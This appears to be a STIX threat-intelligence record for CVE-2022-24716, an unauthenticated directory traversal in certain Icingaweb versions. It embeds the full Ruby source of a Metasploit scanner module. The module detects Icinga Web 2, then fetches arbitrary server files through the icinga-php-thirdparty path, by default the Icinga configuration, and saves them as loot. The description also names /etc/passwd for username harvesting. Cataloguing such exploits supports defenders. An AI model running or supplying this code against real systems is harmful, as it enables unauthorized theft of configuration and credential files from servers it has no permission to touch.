{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--aa62b485-53cc-4e00-84d0-d297759aff0e",
    "created": "2024-08-14T16:28:31.141623Z",
    "modified": "2024-08-14T16:28:31.141627Z",
    "name": "Icingaweb Directory Traversal in Static Library File Requests",
    "description": " Icingaweb versions from 2.9.0 to 2.9.5 inclusive, and 2.8.0 to 2.8.5 inclusive suffer from an unauthenticated directory traversal vulnerability. The vulnerability is triggered through the icinga-php-thirdparty library, which allows unauthenticated users to retrieve arbitrary files from the targets filesystem via a GET request to /lib/icinga/icinga-php-thirdparty/<absolute path to target file on disk> as the user running the Icingaweb server, which will typically be the www-data user.  This can then be used to retrieve sensitive configuration information from the target such as the configuration of various services, which may reveal sensitive login or configuration information, the /etc/passwd file to get a list of valid usernames for password guessing attacks, or other sensitive files which may exist as part of additional functionality available on the target server.  This module was tested against Icingaweb 2.9.5 running on Docker.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/icinga_static_library_file_directory_traversal.rb",
            "external_id": "icinga_static_library_file_directory_traversal.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Icinga/icingaweb2/security/advisories/GHSA-5p3f-rh28-8frw"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Icinga/icingaweb2/commit/9931ed799650f5b8d5e1dc58ea3415a4cdc5773d"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-24716"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Icingaweb Directory Traversal in Static Library File Requests',\n        'Description' => %q{\n          Icingaweb versions from 2.9.0 to 2.9.5 inclusive, and 2.8.0 to 2.8.5 inclusive suffer from an\n          unauthenticated directory traversal vulnerability. The vulnerability is triggered\n          through the icinga-php-thirdparty library, which allows unauthenticated users\n          to retrieve arbitrary files from the targets filesystem via a GET request to\n          /lib/icinga/icinga-php-thirdparty/<absolute path to target file on disk> as the user\n          running the Icingaweb server, which will typically be the www-data user.\n\n          This can then be used to retrieve sensitive configuration information from the target\n          such as the configuration of various services, which may reveal sensitive login\n          or configuration information, the /etc/passwd file to get a list of valid usernames\n          for password guessing attacks, or other sensitive files which may exist as part of\n          additional functionality available on the target server.\n\n          This module was tested against Icingaweb 2.9.5 running on Docker.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'Jacob Ebben', # EDB\n          'Thomas Chauchefoin' # initial POC and discovery\n        ],\n        'References' => [\n          ['EDB', '51329'],\n          ['URL', 'https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/'],\n          ['URL', 'https://github.com/Icinga/icingaweb2/security/advisories/GHSA-5p3f-rh28-8frw'],\n          ['URL', 'https://github.com/Icinga/icingaweb2/commit/9931ed799650f5b8d5e1dc58ea3415a4cdc5773d'],\n          ['CVE', '2022-24716'],\n        ],\n        'Targets' => [\n          ['Icingaweb', {}],\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        },\n        'DisclosureDate' => '2022-05-09',\n        'DefaultTarget' => 0\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('TARGETURI', [true, 'The URI of the Icinga Application', '/']),\n        OptString.new('FILE', [true, 'File to retrieve', '/etc/icinga2/icinga2.conf']) # https://icinga.com/docs/icinga-2/latest/doc/04-configuration/#configuration-overview\n      ]\n    )\n  end\n\n  def check_host(_ip)\n    res = send_request_cgi!(\n      'uri' => normalize_uri(target_uri.path)\n    )\n    return Exploit::CheckCode::Unknown(\"#{peer} - Could not connect to web service - no response\") if res.nil?\n    return Exploit::CheckCode::Unknown(\"#{peer} - Page didn't load correctly (response code: #{res.code}), check TARGETURI/port?\") unless res.code == 200\n    return Exploit::CheckCode::Unknown(\"#{peer} - Page doesn't have a body, check TARGETURI/port?\") if res.body.nil?\n    return Exploit::CheckCode::Detected(\"#{peer} - Icinga Web 2 found, unable to determine version.\") if res.body.include?('<meta name=\"application-name\" content=\"Icinga Web 2\">')\n\n    return Exploit::CheckCode::Safe(\"#{peer} - Web server found, but couldn't detect Icinga\")\n  end\n\n  def run_host(ip)\n    vprint_status('Attempting to retrieve file')\n    res = send_request_cgi!(\n      'uri' => normalize_uri(target_uri.path, 'lib', 'icinga', 'icinga-php-thirdparty', datastore['FILE'])\n    )\n\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Page didn't load correctly. Most likely file doesn't exist (response code: #{res.code})\") unless res.code == 200\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Page didn't load correctly, no body found\") if res.body.nil?\n    if !res.body.empty?\n      print_good(res.body)\n      loot_path = store_loot('icinga file', 'text/plain', ip, res.body, datastore['FILE'])\n      print_good(\"#{datastore['FILE']} saved to #{loot_path}\")\n    else\n      print_error('Response has 0 size.')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-05-09"
}